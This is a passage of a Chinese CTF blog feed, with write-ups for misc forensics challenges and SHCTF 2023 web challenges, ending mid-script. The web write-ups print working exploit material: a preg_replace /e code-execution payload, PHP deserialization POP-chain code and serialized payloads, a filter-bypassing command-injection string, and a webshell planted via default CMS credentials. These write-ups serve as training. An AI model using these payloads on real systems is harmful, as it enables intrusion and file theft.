&quot;23&quot;:&quot;6&quot;,&quot;24&quot;:&quot;7&quot;,&quot;25&quot;:&quot;8&quot;,&quot;26&quot;:&quot;9&quot;,&quot;27&quot;:&quot;0&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;-&quot;,&quot;2e&quot;:&quot;=&quot;,&quot;2f&quot;:&quot;[&quot;,&quot;30&quot;:&quot;]&quot;,&quot;31&quot;:&quot;\\&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;;&quot;,&quot;34&quot;:&quot;&#39;&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;,&quot;,&quot;37&quot;:&quot;.&quot;,&quot;38&quot;:&quot;/&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;shiftKeys = &#123;&quot;04&quot;:&quot;A&quot;, &quot;05&quot;:&quot;B&quot;, &quot;06&quot;:&quot;C&quot;, &quot;07&quot;:&quot;D&quot;, &quot;08&quot;:&quot;E&quot;, &quot;09&quot;:&quot;F&quot;, &quot;0a&quot;:&quot;G&quot;, &quot;0b&quot;:&quot;H&quot;, &quot;0c&quot;:&quot;I&quot;, &quot;0d&quot;:&quot;J&quot;, &quot;0e&quot;:&quot;K&quot;, &quot;0f&quot;:&quot;L&quot;, &quot;10&quot;:&quot;M&quot;, &quot;11&quot;:&quot;N&quot;, &quot;12&quot;:&quot;O&quot;, &quot;13&quot;:&quot;P&quot;, &quot;14&quot;:&quot;Q&quot;, &quot;15&quot;:&quot;R&quot;, &quot;16&quot;:&quot;S&quot;, &quot;17&quot;:&quot;T&quot;, &quot;18&quot;:&quot;U&quot;, &quot;19&quot;:&quot;V&quot;, &quot;1a&quot;:&quot;W&quot;, &quot;1b&quot;:&quot;X&quot;, &quot;1c&quot;:&quot;Y&quot;, &quot;1d&quot;:&quot;Z&quot;,&quot;1e&quot;:&quot;!&quot;, &quot;1f&quot;:&quot;@&quot;, &quot;20&quot;:&quot;#&quot;, &quot;21&quot;:&quot;$&quot;, &quot;22&quot;:&quot;%&quot;, &quot;23&quot;:&quot;^&quot;,&quot;24&quot;:&quot;&amp;&quot;,&quot;25&quot;:&quot;*&quot;,&quot;26&quot;:&quot;(&quot;,&quot;27&quot;:&quot;)&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;_&quot;,&quot;2e&quot;:&quot;+&quot;,&quot;2f&quot;:&quot;&#123;&quot;,&quot;30&quot;:&quot;&#125;&quot;,&quot;31&quot;:&quot;|&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;\&quot;&quot;,&quot;34&quot;:&quot;:&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;&lt;&quot;,&quot;37&quot;:&quot;&gt;&quot;,&quot;38&quot;:&quot;?&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;output = []keys = open(&#39;xxx.txt&#39;)  #数据文件路径for line in keys:try:    if line[0]!=&#39;0&#39; or (line[1]!=&#39;0&#39; and line[1]!=&#39;2&#39;) or line[3]!=&#39;0&#39; or line[4]!=&#39;0&#39; or line[9]!=&#39;0&#39; or line[10]!=&#39;0&#39; or line[12]!=&#39;0&#39; or line[13]!=&#39;0&#39; or line[15]!=&#39;0&#39; or line[16]!=&#39;0&#39; or line[18]!=&#39;0&#39; or line[19]!=&#39;0&#39; or line[21]!=&#39;0&#39; or line[22]!=&#39;0&#39; or line[6:8]==&quot;00&quot;:         continue    if line[6:8] in normalKeys.keys():        output += [[normalKeys[line[6:8]]],[shiftKeys[line[6:8]]]][line[1]==&#39;2&#39;]    else:        output += [&#39;[unknown]&#39;]except:    passkeys.close()flag=0output_text = &quot;&quot;.join(output)for i in range(len(output)):try:    a=output.index(&#39;&lt;DEL&gt;&#39;)    del output[a]    del output[a-1]except:    passfor i in range(len(output)):try:    if output[i]==&quot;&lt;CAP&gt;&quot;:        flag+=1        output.pop(i)        if flag==2:            flag=0    if flag!=0:        output[i]=output[i].upper()except:    passoutput_text = &quot;&quot;.join(output)with open(&#39;xxx.txt&#39;, &#39;w&#39;) as output_file: #先创一个txt，然后把路径放这里output_file.write(output_text)</code></pre><p><img src="https://s2.loli.net/2024/03/08/XT2V4b6IhEnmeA1.png" alt=""></p><p>去掉 unknow 和 space 即可</p><p><img src="https://s2.loli.net/2024/03/08/V7SJvL5OGCZUrsg.png" alt=""></p><p>大写转小写：flag{9919aeb2-a450-2f5f-7bfc-89df4bfa8584}</p><h3 id="R-通大残"><a href="#R-通大残" class="headerlink" title="R 通大残"></a>R 通大残</h3><p>zsteg</p><p><img src="https://s2.loli.net/2024/03/08/fw93MSJ8ZbIti5A.png" alt=""></p><p>顶部有东西<br>直接 zsteg -a 查所有信道</p><p><img src="https://s2.loli.net/2024/03/08/JScCmpkBM25ZWgh.png" alt=""></p><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><p>nmap 流量分析</p><p><a href="https://www.cnblogs.com/zhaof/p/13264836.html">Nmap 常见扫描方式流量分析 - fan-tastic - 博客园</a></p><p><img src="https://s2.loli.net/2024/03/08/zbuXKJM4E7jR2Uo.png" alt=""></p><p>直接搜索[RST]相关的端口</p><p>例如搜到 80 的：</p><p><img src="https://s2.loli.net/2024/03/08/wTfaPzCBeb6uQys.png" alt=""></p><p>总共找到：80,3306,5000,7000,8021,9000</p><p>套上 flag 交了即可</p><h3 id="3-溯源"><a href="#3-溯源" class="headerlink" title="3-溯源"></a>3-溯源</h3><p>冰蝎流量分析</p><p><img src="https://s2.loli.net/2024/03/08/pEviBmeGClVUdoZ.png" alt=""></p><p><a href="https://www.cnblogs.com/CoLo/p/13233359.html">记一次解密 wireshark 抓取的冰蝎通信流量 - Zh1z3ven - 博客园</a></p><p>从 wireshark 导出对象 http 找文件</p><p><img src="https://s2.loli.net/2024/03/08/OWLQmvuTqacn7U2.png" alt=""></p><p>选 app…的类型然后第一个 shell.php 拿下来看看</p><p><img src="https://s2.loli.net/2024/03/08/KUEBf4JIhXW6Nzo.png" alt=""></p><p>是 base64 和 url 编码的混合体，不用管直接解密，可以看到这次冰蝎的 aes 加密的密钥 <strong>e45e329feb5d925b</strong></p><blockquote><p>后续都是先进行 aes 解密再进行 base64 解密得到数据的</p></blockquote><p>接着选到文本类型，进行数据大小的降序排序</p><p><img src="https://s2.loli.net/2024/03/08/N8vYt1VX7DB5TWs.png" alt=""></p><p>导出第一个 1.php，先进行 aes 解密，再 base64</p><p><a href="http://tools.bugscaner.com/cryptoaes/">AES 批量加密解密 - 在线工具</a></p><p><img src="https://s2.loli.net/2024/03/08/9EKcztl3ksJDyZO.png" alt=""></p><p>msg 后面的密文解密 base64 得到</p><p><img src="https://s2.loli.net/2024/03/08/w9Qm2kg1PSKj6dF.png" alt=""></p><p>在数据最后面可以得到内网 IP，再进行 base64 解密即可</p><p><img src="https://s2.loli.net/2024/03/08/BDmjpUf6CbsPeiF.png" alt=""></p><p>IP:172.17.0.2</p><p>再回到导出对象，进行升序，选择数据大小最小的 1.php</p><p><img src="https://s2.loli.net/2024/03/08/Rvneyj7Ip9YDlTM.png" alt=""></p><p>老办法操作后可以得到用户名</p><p><img src="https://s2.loli.net/2024/03/08/dR2sGtipWqzXHrO.png" alt=""></p><p><img src="https://s2.loli.net/2024/03/08/duOqPtCxX8vejJb.png" alt=""></p><p>交上 flag{www-data_172.17.0.2}成功</p><h3 id="依旧是空白"><a href="#依旧是空白" class="headerlink" title="依旧是空白"></a>依旧是空白</h3><p>   宽高 snow 隐写</p><p>图片修改宽高看到 password</p><p><img src="https://s2.loli.net/2024/03/08/9tFeAgdqGuBmwM1.png" alt=""></p><p>空白格涉及密码的可以想到 snow 隐写</p><p><img src="https://s2.loli.net/2024/03/08/HDu48XgncGz3taK.png" alt=""></p><h3 id="第一次取证"><a href="#第一次取证" class="headerlink" title="第一次取证"></a>第一次取证</h3><p>内存取证 volatility</p><blockquote><p>这题要用 python2 运行 volatility2</p></blockquote><p><img src="https://s2.loli.net/2024/03/08/NKfnamlHXBLQjg7.png" alt=""></p><pre><code>E:\python2.7.18\python.exe vol.py -f C:\Users\Nanian233\Desktop\dycqz.raw imageinfo</code></pre><p><img src="https://s2.loli.net/2024/03/08/yZ4mpVXfevF1hsA.png" alt=""></p><p>取第一个系统 Win7SP1x64，<strong>显示有关编辑控件（曾经编辑过的内容）的信息 editbox</strong></p><pre><code>E:\python2.7.18\python.exe vol.py -f C:\Users\Nanian233\Desktop\dycqz.raw --profile=Win7SP1x64 editbox</code></pre><p><img src="https://s2.loli.net/2024/03/08/tRrPVwzfUM8ciKI.png" alt=""></p><p>解密下面的字符串</p><p><img src="https://s2.loli.net/2024/03/08/b3k5DaHUS1NduJK.png" alt=""></p><h3 id="隐秘的图片"><a href="#隐秘的图片" class="headerlink" title="隐秘的图片"></a>隐秘的图片</h3><p>二维码异或</p><p><img src="https://s2.loli.net/2024/03/08/IXtF6seJ3aUSiP9.png" alt=""></p><p>Stegsolve 打开</p><p>两张图异或</p><p><img src="https://s2.loli.net/2024/03/08/GR2q5EZHtFVsNi7.png" alt=""></p><p>扫码即可</p><p><img src="https://s2.loli.net/2024/03/08/tdUhnlgmLszCReu.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> MISC </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SHCTF 2023</title>
      <link href="/posts/SHCTF2023.html"/>
      <url>/posts/SHCTF2023.html</url>
      
        <content type="html"><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="WEEK1-ezphp"><a href="#WEEK1-ezphp" class="headerlink" title="[WEEK1]ezphp"></a><strong>[WEEK1]ezphp</strong></h3><p>   prep_replace /e    命令执行</p><p><a href="https://blog.csdn.net/weixin_49656607/article/details/119833707">深入研究 preg_replace \e 模式下的代码执行_preg_replace /e-CSDN 博客</a></p><p><a href="https://www.cnblogs.com/HelloCTF/p/13184476.html#%E7%9C%8B%E4%B8%80%E9%81%93ctf%E9%A2%98-----bjdctf2020zjctf%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4">preg_replace 函数/e 模式下的代码执行 + 一道例题 - Hel10 - 博客园</a></p><p><a href="https://www.cnblogs.com/dhsx/p/4991983.html">慎用 preg_replace 危险的/e 修饰符(一句话后门常用) - 稻禾盛夏 - 博客园</a></p><p><strong>payload：<br>GET:<br>?code=${phpinfo()}<br>POST:<br>pattern=.*</strong></p><p>Ctrl+f 搜索 flag 即可</p><h3 id="WEEK1-ez-serialize"><a href="#WEEK1-ez-serialize" class="headerlink" title="[WEEK1]ez_serialize"></a><strong>[WEEK1]ez_serialize</strong></h3><p>反序列化 invoke wakeup get toString</p><p><a href="https://blog.csdn.net/solitudi/article/details/113588692">[CTF]PHP 反序列化总结_ctf php 反序列化-CSDN 博客</a></p><p><a href="https://www.bilibili.com/video/BV1R24y1r71C/?p=14&amp;spm_id_from=333.1007.top_right_bar_window_history.content.click&amp;vd_source=f7e76ebc6ca15fbb8c8dc4909fad4f40">0x013 pop 链构造解释_哔哩哔哩_bilibili</a></p><p><strong>exp：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$var_1</span>=<span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   <span class="keyword">include</span>(<span class="variable language_">$this</span>-&gt;var_1);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$q</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;q)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;           </span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$z</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;z-&gt;<span class="keyword">var</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$d</span>=<span class="keyword">new</span> <span class="title function_ invoke__">D</span>();</span><br><span class="line"><span class="variable">$d</span>-&gt;p=<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;z=<span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="keyword">var</span>=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;q=<span class="variable">$c</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><pre><code>?payload=O:1:&quot;B&quot;:1:&#123;s:1:&quot;q&quot;;O:1:&quot;C&quot;:2:&#123;s:3:&quot;var&quot;;r:1;s:1:&quot;z&quot;;O:1:&quot;D&quot;:1:&#123;s:1:&quot;p&quot;;O:1:&quot;A&quot;:1:&#123;s:5:&quot;var_1&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;&#125;&#125;&#125;&#125;</code></pre><h3 id="WEEK1-babyRCE"><a href="#WEEK1-babyRCE" class="headerlink" title="[WEEK1]babyRCE"></a>[WEEK1]babyRCE</h3><p>rce</p><p><img src="https://s2.loli.net/2024/03/08/ON594zohXw21uvG.png" alt=""></p><p><strong>uniq 没过滤</strong></p><p><strong>flag 用 fl?g 代替</strong></p><p><strong>分号用 %0a 代替</strong></p><p><strong>空格用 %09 代替</strong></p><pre><code>?rce=uniq$IFS/fl?g%0a</code></pre><h3 id="WEEK1-生成你的邀请函吧"><a href="#WEEK1-生成你的邀请函吧" class="headerlink" title="[WEEK1]生成你的邀请函吧~"></a><strong>[WEEK1]生成你的邀请函吧~</strong></h3><p>request 请求</p><p><img src="https://s2.loli.net/2024/03/08/ocwKgbteWvGYBAz.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义API端点URL</span></span><br><span class="line">url = <span class="string">&quot;url/generate_invitation&quot;</span> <span class="comment">#放url</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 准备请求体数据</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Yourname&quot;</span>,</span><br><span class="line">    <span class="string">&quot;imgurl&quot;</span>: <span class="string">&quot;http://q.qlogo.cn/headimg_dl?dst_uin=QQnumb&amp;spec=640&amp;img_type=jpg&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送POST请求</span></span><br><span class="line">response = requests.post(url, json=data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查响应状态码</span></span><br><span class="line"><span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">    <span class="comment"># 以二进制方式写入响应内容到文件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;invitation.jpg&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(response.content)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;邀请函已保存为 invitation.jpg&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;请求失败，状态码:&quot;</span>, response.status_code)</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/03/08/k4MAlVHROESdxez.png" alt=""></p><h3 id="WEEK1-飞机大战"><a href="#WEEK1-飞机大战" class="headerlink" title="[WEEK1]飞机大战"></a><strong>[WEEK1]飞机大战</strong></h3><p>  js 代码检查</p><p>搜索 won</p><p><img src="https://s2.loli.net/2024/03/08/uLazEUkrVxZD85C.png" alt=""></p><p>解 unicode 再转 base64</p><p><img src="https://s2.loli.net/2024/03/08/bFuhfae8KOL3iEt.png" alt=""></p><h3 id="WEEK1-登录就给-flag"><a href="#WEEK1-登录就给-flag" class="headerlink" title="[WEEK1]登录就给 flag"></a><strong>[WEEK1]登录就给 flag</strong></h3><p>爆破密码</p><p><img src="https://s2.loli.net/2024/03/08/9FN6hXBlU7bP3qa.png" alt=""></p><p>爆破密码即可，这里用的弱口令字典爆破</p><p><img src="https://s2.loli.net/2024/03/08/9fPEFT5ZYxOmRj4.png" alt=""></p><p><img src="https://s2.loli.net/2024/03/08/yCagipwA8el9RJ3.png" alt=""></p><p><img src="https://s2.loli.net/2024/03/08/CfhA7uLzEF2IR6V.png" alt=""></p><h3 id="WEEK1-1zzphp"><a href="#WEEK1-1zzphp" class="headerlink" title="[WEEK1]1zzphp"></a><strong>[WEEK1]1zzphp</strong></h3><p>正则回溯绕过，正则匹配数组绕过</p><p><img src="https://s2.loli.net/2024/03/08/qtKxZkaWlcjSeiI.png" alt=""></p><p>num[]=1 绕过前两个 if</p><p>后面两个 if 绕过如下 <a href="https://blog.csdn.net/yourdawntown/article/details/120558237">blog.csdn.net</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">data=&#123;<span class="string">&quot;c_ode&quot;</span>:<span class="string">&quot;a&quot;</span>*<span class="number">1000000</span>+<span class="string">&quot;2023SHCTF&quot;</span>&#125;</span><br><span class="line">url=<span class="string">&quot;http://112.6.51.212:30028/?num[]=1&quot;</span></span><br><span class="line">res = requests.post(data=data,url=url)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/03/08/QGYVbsW84yI5PfM.png" alt=""></p><h3 id="WEEK2-no-wake-up"><a href="#WEEK2-no-wake-up" class="headerlink" title="[WEEK2]no_wake_up"></a><strong>[WEEK2]no_wake_up</strong></h3><p>wake_up 绕过</p><p><img src="https://s2.loli.net/2024/03/08/wlnrA89Y64ZWozH.png" alt=""></p><p>绕过 wake up 即可，利用伪协议读 flag.php</p><p><img src="https://s2.loli.net/2024/03/08/cETJxLbj7VeS2Fr.png" alt=""></p><p>构造 payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">flag</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>O:4:”flag”:2:{s:8:”username”;s:5:”admin”;s:4:”code”;s:57:”php://filter/read=convert.base64-encode/resource=flag.php”;}</strong></p><p>给前面的属性值 +1 即可绕过</p><pre><code>O:4:&quot;flag&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:4:&quot;code&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;&#125;</code></pre><p><img src="https://s2.loli.net/2024/03/08/1M2uwDqOLF6TGWz.png" alt=""></p><p><img src="https://s2.loli.net/2024/03/08/iO8LBa73JQks5YW.png" alt=""></p><h3 id="WEEK2-EasyCMS"><a href="#WEEK2-EasyCMS" class="headerlink" title="[WEEK2]EasyCMS"></a><strong>[WEEK2]EasyCMS</strong></h3><p>   taoCMS 漏洞</p><p><a href="https://blog.csdn.net/huayimy/article/details/127611217">Taocms 代码注入漏洞(CVE-2022-25578)_taocms 演示系统漏洞</a></p><p>dirsearch 扫到后台的登录地址</p><p>URL/admin/admin.php</p><p>账号：admin（默认）</p><p>密码：tao    （默认）</p><p>成功登录管理员账户</p><p><img src="https://s2.loli.net/2024/03/08/IjAu78Wo2CYdmHt.png" alt=""></p><p>在文件管理处新建一个 php 文件，内容为一句话木马，然后保存访问执行系统命令即可</p><p><img src="https://s2.loli.net/2024/03/08/6jR3eEGDsYCu2hH.png" alt=""></p><h3 id="WEEK2-MD5-的事就拜托了"><a href="#WEEK2-MD5-的事就拜托了" class="headerlink" title="[WEEK2]MD5 的事就拜托了"></a><strong>[WEEK2]MD5 的事就拜托了</strong></h3><p>parse_url() 套娃，intval()漏洞   哈希长度拓展攻击</p><p><code>&lt;?php$url = &#39;host://SHCTF:pass@user/SHCTF?args=value#anch&#39;;print_r(parse_url($url));echo parse_url($url, PHP_URL_PATH);?&gt;</code></p><p><img src="https://s2.loli.net/2024/03/08/F9bpCiVQArzMR3I.png" alt=""></p><p><strong>第一个if：parse_url函数的解释和绕过<br>让$schema =host<br>则<script type="math/tex">schema=$host让$host=user$z</script>schema=$host=user<br>让user=SHCTF<br>则$$$schema=SHCTF<br>POST:SHCTF=host://SHCTF:pass@user/SHCTF?args=value#anch<br>第二个if：<br>利用intval(400.123)=400的特性<br>?length=4.1234</strong></p><p><img src="https://s2.loli.net/2024/03/08/JNGftxzeWld4Phu.png" alt=""></p><p><img src="https://s2.loli.net/2024/03/08/wiQDBKIt9LdXVNE.png" alt=""></p><p><strong>$flag<br>       md5值：c1514bd780fad6fcaf27bde0344acee0<br>       长度：42<br>$num，$SHCTF均可控<br>if($_POST[‘SHCTF’]===md5($flag.urldecode($num))) #这里的.和+是一个意思，都是拼接<br>假如$flag=aaa , $num=123<br>则拼接为aaa123<br>这里涉及到哈希长度拓展攻击</strong></p><p><a href="https://zu1k.com/posts/security/crypto/md5-hash-length-extension-attack/">MD5 的 Hash 长度扩展攻击原理及应用</a></p><p>下面是一个 py 脚本，能实现 hashpump 的功能（来自 <a href="https://github.com/shellfeel/hash-ext-attack/tree/master">hash-ext-attack</a>）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span 